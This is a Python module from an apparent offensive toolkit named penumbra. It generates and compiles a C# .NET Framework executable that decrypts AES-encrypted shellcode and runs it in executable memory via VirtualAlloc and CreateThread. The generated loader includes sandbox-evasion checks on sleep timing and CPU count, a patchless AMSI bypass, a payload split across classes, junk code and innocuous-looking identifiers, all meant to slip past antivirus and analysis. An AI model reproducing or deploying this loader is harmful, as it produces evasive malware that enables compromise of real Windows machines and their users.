"""Shellcode loader pass — generates a C# exe that decrypts and executes shellcode.

The loader targets .NET Framework 4.7.2 (net472) so it runs on any modern
Windows without requiring a separate .NET runtime installation.

Features:
- Sandbox evasion (sleep acceleration, CPU count check)
- AES-256-CBC decryption at runtime
- VirtualAlloc + CreateThread shellcode execution
- HWBP+VEH patchless AMSI bypass
- Payload fragmented across multiple classes with junk code
- Plausible identifier names throughout
"""

from __future__ import annotations

import base64
import secrets
import shutil
import subprocess
import tempfile
from pathlib import Path

from penumbra.dotnet.embed import (
    _fragment_payload,
    _generate_junk_class,
    _hwbp_veh_bypass_cs,
    _plausible_class,
    _plausible_field,
    _plausible_name,
)
from penumbra.types import PassConfig


def _generate_shellcode_loader_project(
    encrypted_b64: str,
    key_b64: str,
    iv_b64: str,
    project_dir: Path,
) -> None:
    """Generate a C# project that decrypts and executes shellcode."""
    chunks = _fragment_payload(encrypted_b64)

    used_class_names: set[str] = set()

    # Main class and identifiers
    main_cls = _plausible_class()
    used_class_names.add(main_cls)
    entry_method = _plausible_name()
    key_field = _plausible_field()
    iv_field = _plausible_field()
    result_var = _plausible_field()
    sc_var = _plausible_field()

    # AMSI bypass
    amsi_cls = _plausible_class()
    while amsi_cls in used_class_names:
        amsi_cls = _plausible_class()
    used_class_names.add(amsi_cls)
    amsi_method = _plausible_name()

    # Fragment holder classes
    fragment_classes: list[str] = []
    fragment_refs: list[str] = []

    for i, chunk in enumerate(chunks):
        cls_name = _plausible_class()
        while cls_name in used_class_names:
            cls_name = _plausible_class() + str(i)
        used_class_names.add(cls_name)
        field_name = _plausible_field()
        fragment_classes.append(
            f"internal static class {cls_name}\n{{\n"
            f"    internal static readonly string {field_name} =\n"
            f'        "{chunk}";\n'
            f"}}\n"
        )
        fragment_refs.append(f"{cls_name}.{field_name}")

    if len(fragment_refs) == 1:
        reassemble_expr = fragment_refs[0]
    else:
        reassemble_expr = " + ".join(fragment_refs)

    # Junk classes
    junk_classes: list[str] = []
    for _ in range(secrets.randbelow(4) + 5):
        junk_classes.append(_generate_junk_class(used_class_names))

    # .csproj — net472 WinExe
    (project_dir / "Loader.csproj").write_text(
        '<Project Sdk="Microsoft.NET.Sdk">\n'
        "  <PropertyGroup>\n"
        "    <OutputType>WinExe</OutputType>\n"
        "    <TargetFramework>net472</TargetFramework>\n"
        "    <LangVersion>10</LangVersion>\n"
        "  </PropertyGroup>\n"
        "</Project>\n"
    )

    # AmsiBypass.cs
    (project_dir / "AmsiBypass.cs").write_text(
        _hwbp_veh_bypass_cs(amsi_cls, amsi_method, public=False)
    )

    # P/Invoke names
    alloc_method = _plausible_name()
    thread_method = _plausible_name()
    wait_method = _plausible_name()
    sleep_check_var = _plausible_field()

    program_cs = (
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "using System.Security.Cryptography;\n\n"
        f"internal static class {main_cls}\n"
        "{\n"
        f'    private static readonly string {key_field} = '
        f'"{key_b64}";\n'
        f'    private static readonly string {iv_field} = '
        f'"{iv_b64}";\n\n'
        # P/Invoke declarations
        '    [DllImport("kernel32.dll")]\n'
        f"    private static extern IntPtr {alloc_method}(\n"
        "        IntPtr a, uint s, uint t, uint p);\n"
        '    [DllImport("kernel32.dll")]\n'
        f"    private static extern IntPtr {thread_method}(\n"
        "        IntPtr a, uint sz, IntPtr fn,\n"
        "        IntPtr p, uint f, IntPtr tid);\n"
        '    [DllImport("kernel32.dll")]\n'
        f"    private static extern uint {wait_method}(\n"
        "        IntPtr h, uint ms);\n\n"
        f"    private static void {entry_method}()\n"
        "    {\n"
        # Sandbox: sleep acceleration
        f"        var {sleep_check_var} = DateTime.Now;\n"
        "        System.Threading.Thread.Sleep(1500);\n"
        f"        if ((DateTime.Now - {sleep_check_var})"
        ".TotalMilliseconds < 1000)\n"
        "            return;\n\n"
        # Sandbox: CPU count
        "        if (Environment.ProcessorCount < 2) return;\n\n"
        # AMSI bypass
        f"        {amsi_cls}.{amsi_method}();\n\n"
        # Reassemble and decrypt
        f"        var {result_var} = Convert.FromBase64String(\n"
        f"            {reassemble_expr});\n"
        f"        var keyBytes = Convert.FromBase64String({key_field});\n"
        f"        var ivBytes = Convert.FromBase64String({iv_field});\n\n"
        "        using (var aes = Aes.Create())\n"
        "        {\n"
        "            aes.Key = keyBytes;\n"
        "            aes.IV = ivBytes;\n"
        "            var dec = aes.CreateDecryptor();\n"
        f"            var {sc_var} = dec.TransformFinalBlock(\n"
        f"                {result_var}, 0, {result_var}.Length);\n\n"
        # Shellcode execution
        f"            IntPtr addr = {alloc_method}(\n"
        f"                IntPtr.Zero, (uint){sc_var}.Length,\n"
        "                0x3000, 0x40);\n"
        f"            Marshal.Copy({sc_var}, 0, addr,\n"
        f"                {sc_var}.Length);\n"
        f"            IntPtr hThread = {thread_method}(\n"
        "                IntPtr.Zero, 0, addr,\n"
        "                IntPtr.Zero, 0, IntPtr.Zero);\n"
        f"            {wait_method}(hThread, 0xFFFFFFFF);\n"
        "        }\n"
        "    }\n\n"
        "    private static void Main(string[] args)"
        f" => {entry_method}();\n"
        "}\n"
    )
    (project_dir / "Program.cs").write_text(program_cs)

    # Fragment files
    for i, frag_src in enumerate(fragment_classes):
        (project_dir / f"Fragment{i}.cs").write_text(
            "using System;\n\n" + frag_src
        )

    # Junk files
    for i, junk_src in enumerate(junk_classes):
        (project_dir / f"Module{i}.cs").write_text(
            "using System;\n\n" + junk_src
        )


class ShellcodeLoaderPass:
    """Generate a .NET Framework 4.7.2 exe that decrypts and runs shellcode.

    Expects input in the format produced by :class:`ShellcodeEncryptPass`:
    ``key (32 bytes) || IV (16 bytes) || AES-256-CBC ciphertext``.

    The generated exe includes sandbox evasion, AMSI bypass, payload
    fragmentation, and junk code for entropy reduction.
    """

    @property
    def name(self) -> str:
        return "loader"

    def apply(self, data: bytes, config: PassConfig) -> bytes:
        fmt = config.extra.get("format")
        if fmt == "ps1":
            raise NotImplementedError(
                "PS1 shellcode format not yet implemented."
            )

        if not shutil.which("dotnet"):
            raise RuntimeError(
                "dotnet SDK not found. Install .NET 8+ SDK."
            )

        if len(data) < 48 + 1:
            raise ValueError(
                "Encrypted shellcode too short. Expected "
                "[32-byte key][16-byte IV][ciphertext]."
            )

        key = data[:32]
        iv = data[32:48]
        ciphertext = data[48:]

        key_b64 = base64.b64encode(key).decode("ascii")
        iv_b64 = base64.b64encode(iv).decode("ascii")
        encrypted_b64 = base64.b64encode(ciphertext).decode("ascii")

        tmp_dir = tempfile.mkdtemp(prefix="penumbra_sc_loader_")
        tmp_path = Path(tmp_dir)

        try:
            _generate_shellcode_loader_project(
                encrypted_b64, key_b64, iv_b64, tmp_path,
            )

            out_dir = tmp_path / "out"
            result = subprocess.run(
                [
                    "dotnet", "publish", str(tmp_path),
                    "-c", "Release", "-o", str(out_dir),
                    "--nologo",
                ],
                capture_output=True,
            )

            if result.returncode != 0:
                stderr = result.stderr.decode(
                    "utf-8", errors="replace"
                )
                stdout = result.stdout.decode(
                    "utf-8", errors="replace"
                )
                raise RuntimeError(
                    f"Loader build failed:\n{stderr}\n{stdout}"
                )

            exe_path = out_dir / "Loader.exe"
            if not exe_path.exists():
                files = (
                    [f.name for f in out_dir.iterdir()]
                    if out_dir.exists()
                    else []
                )
                raise RuntimeError(
                    f"Loader output not found. Files: {files}"
                )

            return exe_path.read_bytes()
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)
